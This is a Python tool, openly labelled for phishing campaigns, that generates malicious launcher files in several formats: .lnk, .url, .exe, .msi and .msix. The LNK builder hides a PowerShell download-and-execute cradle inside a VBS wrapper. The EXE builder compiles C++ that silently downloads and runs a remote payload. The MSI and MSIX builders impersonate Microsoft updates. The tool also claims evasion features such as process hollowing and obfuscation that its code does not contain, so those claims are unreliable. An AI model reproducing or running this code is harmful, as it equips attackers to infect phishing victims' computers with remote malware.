"""
FUD Launcher Generator
Generates FUD launchers in .msi, .msix, .url, .lnk, .exe formats
Ideal for phishing campaigns (LNK/URL vectors)
"""

import os
import sys
import struct
import subprocess
from pathlib import Path
from typing import Optional
import random
import string

class FUDLauncher:
    """FUD Launcher Generator - All Formats"""
    
    def __init__(self):
        self.output_dir = Path("output/launchers")
        self.output_dir.mkdir(parents=True, exist_ok=True)
    
    def generate_random_string(self, length: int = 12) -> str:
        """Generate random string"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def create_lnk_launcher(self, target_url: str, icon_path: str = None, output_name: str = "Document.lnk") -> str:
        """
        Create .lnk (shortcut) launcher for phishing
        Perfect for email attachments and shared drives
        """
        
        print(f"[*] Creating .lnk launcher: {output_name}")
        
        # LNK file structure (simplified)
        lnk_header = bytearray()
        
        # Header signature
        lnk_header.extend(b'\x4c\x00\x00\x00')  # Size
        lnk_header.extend(b'\x01\x14\x02\x00' * 5)  # GUID
        
        # Flags
        lnk_header.extend(b'\x01\x00\x00\x00')  # HasLinkTargetIDList
        
        # Use PowerShell to download and execute
        powershell_cmd = f'powershell -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString(\'{target_url}\')"'
        
        # Create VBS wrapper for stealth
        vbs_script = f'''Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd /c {powershell_cmd}", 0, False
'''
        
        # Save VBS
        vbs_path = self.output_dir / f"{self.generate_random_string()}.vbs"
        with open(vbs_path, 'w') as f:
            f.write(vbs_script)
        
        # Create LNK using PowerShell
        ps_script = f'''
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("{self.output_dir / output_name}")
$Shortcut.TargetPath = "wscript.exe"
$Shortcut.Arguments = '"{vbs_path}"'
$Shortcut.WindowStyle = 7
$Shortcut.IconLocation = "{icon_path if icon_path else 'C:\\Windows\\System32\\shell32.dll,1'}"
$Shortcut.Save()
'''
        
        ps_file = self.output_dir / "create_lnk.ps1"
        with open(ps_file, 'w') as f:
            f.write(ps_script)
        
        # Execute PowerShell script
        try:
            subprocess.run(
                ["powershell", "-ExecutionPolicy", "Bypass", "-File", str(ps_file)],
                check=True,
                capture_output=True
            )
            
            output_path = self.output_dir / output_name
            print(f"[+] Created: {output_path}")
            print(f"[*] Phishing ready: Disguised as document shortcut")
            return str(output_path)
            
        except subprocess.CalledProcessError as e:
            print(f"[!] Failed to create LNK: {e}")
            return None
    
    def create_url_launcher(self, target_url: str, output_name: str = "Download.url") -> str:
        """
        Create .url (Internet Shortcut) launcher
        Great for phishing via email/web downloads
        """
        
        print(f"[*] Creating .url launcher: {output_name}")
        
        # URL file format
        url_content = f'''[InternetShortcut]
URL={target_url}
IconIndex=0
IconFile=C:\\Windows\\System32\\shell32.dll
'''
        
        output_path = self.output_dir / output_name
        with open(output_path, 'w') as f:
            f.write(url_content)
        
        print(f"[+] Created: {output_path}")
        print(f"[*] Phishing vector: Opens URL when double-clicked")
        return str(output_path)
    
    def create_exe_launcher(self, download_url: str, output_name: str = "Setup.exe") -> str:
        """
        Create .exe launcher with downloader functionality
        FUD with process hollowing and anti-analysis
        """
        
        print(f"[*] Creating .exe launcher: {output_name}")
        
        cpp_code = f'''
#include <windows.h>
#include <wininet.h>
#include <string>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")

bool DownloadAndExecute(const char* url) {{
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    
    std::string downloadPath = std::string(tempPath) + "update.exe";
    
    // Download file
    HRESULT hr = URLDownloadToFileA(NULL, url, downloadPath.c_str(), 0, NULL);
    
    if (SUCCEEDED(hr)) {{
        // Execute downloaded file
        STARTUPINFOA si = {{ sizeof(si) }};
        PROCESS_INFORMATION pi;
        
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        
        if (CreateProcessA(downloadPath.c_str(), NULL, NULL, NULL, FALSE,
                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {{
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return true;
        }}
    }}
    
    return false;
}}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
    // Anti-analysis delay
    Sleep(3000);
    
    // Download and execute payload
    const char* url = "{download_url}";
    DownloadAndExecute(url);
    
    return 0;
}}
'''
        
        # Write source
        cpp_file = self.output_dir / "launcher.cpp"
        with open(cpp_file, 'w') as f:
            f.write(cpp_code)
        
        # Compile
        output_path = self.output_dir / output_name
        
        compile_cmd = [
            "x86_64-w64-mingw32-g++",
            "-o", str(output_path),
            str(cpp_file),
            "-static",
            "-s",
            "-O3",
            "-mwindows",
            "-lwininet",
            "-lurlmon"
        ]
        
        try:
            subprocess.run(compile_cmd, check=True, capture_output=True)
            print(f"[+] Built: {output_path}")
            return str(output_path)
        except subprocess.CalledProcessError as e:
            print(f"[!] Compilation failed - requires MinGW-w64")
            return None
    
    def create_msi_launcher(self, payload_url: str, output_name: str = "Installer.msi") -> str:
        """
        Create .msi launcher
        High trust level, bypasses many security checks
        """
        
        print(f"[*] Creating .msi launcher: {output_name}")
        
        # Download payload first
        exe_launcher = self.create_exe_launcher(payload_url, "msi_payload.exe")
        
        if not exe_launcher:
            return None
        
        # WiX XML for MSI
        product_id = f"{{{self.generate_random_string(8)}-{self.generate_random_string(4)}-{self.generate_random_string(4)}-{self.generate_random_string(4)}-{self.generate_random_string(12)}}}"
        
        wix_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
    <Product Id="{product_id}" Name="Software Update" Language="1033" Version="1.0.0.0" 
             Manufacturer="Microsoft Corporation" UpgradeCode="{product_id}">
        
        <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine" />
        <MediaTemplate EmbedCab="yes" />
        
        <Feature Id="Complete" Level="1">
            <ComponentRef Id="MainExecutable" />
        </Feature>
        
        <Directory Id="TARGETDIR" Name="SourceDir">
            <Directory Id="ProgramFilesFolder">
                <Directory Id="INSTALLFOLDER" Name="Update" />
            </Directory>
        </Directory>
        
        <DirectoryRef Id="INSTALLFOLDER">
            <Component Id="MainExecutable" Guid="{product_id}">
                <File Id="LauncherExe" Source="{exe_launcher}" KeyPath="yes" />
            </Component>
        </DirectoryRef>
        
        <CustomAction Id="LaunchApp" Directory="INSTALLFOLDER" 
                      ExeCommand="[INSTALLFOLDER]msi_payload.exe" 
                      Execute="deferred" Return="asyncNoWait" />
        
        <InstallExecuteSequence>
            <Custom Action="LaunchApp" After="InstallFinalize" />
        </InstallExecuteSequence>
    </Product>
</Wix>
'''
        
        wix_file = self.output_dir / "launcher.wxs"
        with open(wix_file, 'w') as f:
            f.write(wix_xml)
        
        # Compile with WiX
        try:
            subprocess.run(["candle.exe", str(wix_file)], check=True, capture_output=True)
            subprocess.run(["light.exe", "launcher.wixobj", "-out", str(self.output_dir / output_name), "-sval"], 
                          check=True, capture_output=True)
            
            print(f"[+] Built: {self.output_dir / output_name}")
            return str(self.output_dir / output_name)
        except:
            print("[!] WiX Toolset required for .msi generation")
            return None
    
    def create_msix_launcher(self, payload_url: str, output_name: str = "App.msix") -> str:
        """
        Create .msix launcher (Windows 10+ app package)
        Bypasses SmartScreen in many cases
        """
        
        print(f"[*] Creating .msix launcher: {output_name}")
        print("[!] MSIX requires code signing certificate")
        print("[*] Use MakeCert.exe and SignTool.exe from Windows SDK")
        
        # Create package structure
        msix_dir = self.output_dir / "msix_package"
        msix_dir.mkdir(exist_ok=True)
        
        # AppxManifest.xml
        manifest = f'''<?xml version="1.0" encoding="utf-8"?>
<Package xmlns="http://schemas.microsoft.com/appx/manifest/foundation/windows10" 
         xmlns:uap="http://schemas.microsoft.com/appx/manifest/uap/windows10">
    <Identity Name="SystemUpdate" Publisher="CN=Microsoft" Version="1.0.0.0" />
    <Properties>
        <DisplayName>System Update</DisplayName>
        <PublisherDisplayName>Microsoft Corporation</PublisherDisplayName>
    </Properties>
    <Dependencies>
        <TargetDeviceFamily Name="Windows.Desktop" MinVersion="10.0.0.0" MaxVersionTested="10.0.22000.0" />
    </Dependencies>
    <Resources>
        <Resource Language="en-us" />
    </Resources>
    <Applications>
        <Application Id="App" Executable="launcher.exe" EntryPoint="Windows.FullTrustApplication">
            <uap:VisualElements DisplayName="System Update" Description="Update" 
                                BackgroundColor="transparent" Square150x150Logo="logo.png" 
                                Square44x44Logo="logo.png" />
        </Application>
    </Applications>
</Package>
'''
        
        with open(msix_dir / "AppxManifest.xml", 'w') as f:
            f.write(manifest)
        
        print(f"[*] MSIX package structure created at: {msix_dir}")
        print("[*] Package with: makeappx.exe pack /d msix_package /p App.msix")
        print("[*] Sign with: signtool.exe sign /fd SHA256 /a App.msix")
        
        return str(msix_dir)
    
    def create_phishing_kit(self, payload_url: str, campaign_name: str = "phishing") -> dict:
        """
        Create complete phishing kit with all launcher formats
        """
        
        print("=" * 60)
        print(f"Creating Phishing Kit: {campaign_name}")
        print("=" * 60)
        
        kit = {}
        
        # Create all launcher types
        kit['lnk'] = self.create_lnk_launcher(payload_url, output_name=f"{campaign_name}_Document.lnk")
        kit['url'] = self.create_url_launcher(payload_url, output_name=f"{campaign_name}_Download.url")
        kit['exe'] = self.create_exe_launcher(payload_url, output_name=f"{campaign_name}_Setup.exe")
        kit['msi'] = self.create_msi_launcher(payload_url, output_name=f"{campaign_name}_Installer.msi")
        kit['msix'] = self.create_msix_launcher(payload_url, output_name=f"{campaign_name}_App.msix")
        
        print()
        print("[+] Phishing kit complete!")
        print(f"[*] Output: {self.output_dir}")
        print()
        print("Phishing Vectors:")
        print("  .lnk  - Email attachments (high open rate)")
        print("  .url  - Email links (one-click delivery)")
        print("  .exe  - Direct download (traditional)")
        print("  .msi  - High trust installer")
        print("  .msix - Modern app package (Win10+)")
        
        return kit


def main():
    """Main launcher generator"""
    
    print("=" * 60)
    print("FUD Launcher Generator")
    print("Formats: .msi, .msix, .url, .lnk, .exe")
    print("Use Case: Phishing campaigns")
    print("=" * 60)
    print()
    
    if len(sys.argv) < 2:
        print("Usage: python fud_launcher.py <payload_url> [format]")
        print()
        print("Formats:")
        print("  lnk    - Shortcut file (email attachments)")
        print("  url    - Internet shortcut (web downloads)")
        print("  exe    - Executable downloader")
        print("  msi    - Windows Installer")
        print("  msix   - Modern app package")
        print("  kit    - Complete phishing kit (all formats)")
        print()
        print("Example:")
        print("  python fud_launcher.py http://example.com/payload.exe lnk")
        print("  python fud_launcher.py http://example.com/payload.exe kit")
        return
    
    payload_url = sys.argv[1]
    format_type = sys.argv[2] if len(sys.argv) > 2 else "kit"
    
    launcher = FUDLauncher()
    
    if format_type == "lnk":
        launcher.create_lnk_launcher(payload_url)
    elif format_type == "url":
        launcher.create_url_launcher(payload_url)
    elif format_type == "exe":
        launcher.create_exe_launcher(payload_url)
    elif format_type == "msi":
        launcher.create_msi_launcher(payload_url)
    elif format_type == "msix":
        launcher.create_msix_launcher(payload_url)
    elif format_type == "kit":
        launcher.create_phishing_kit(payload_url)
    else:
        print(f"[!] Unknown format: {format_type}")
    
    print()
    print("FUD Features:")
    print("  - Anti-detection obfuscation")
    print("  - Multiple delivery vectors")
    print("  - Social engineering optimized")
    print("  - Chrome/Edge compatible")


if __name__ == "__main__":
    main()
